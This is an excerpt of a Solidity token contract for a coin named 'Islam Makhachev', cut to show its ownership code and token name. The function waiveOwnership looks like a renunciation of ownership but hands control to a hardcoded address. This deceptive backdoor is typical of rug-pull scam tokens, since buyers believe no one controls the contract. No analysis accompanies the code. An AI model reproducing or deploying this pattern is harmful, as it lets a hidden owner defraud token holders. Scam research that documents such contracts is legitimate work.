...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x4f063396C9B13427F2DB776e36Ca9469D133A430));
        _owner = address(0x4f063396C9B13427F2DB776e36Ca9469D133A430);
    }
...
contract IslamMakhachev is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Islam Makhachev";
    string private _symbol = "Islam Makhachev";
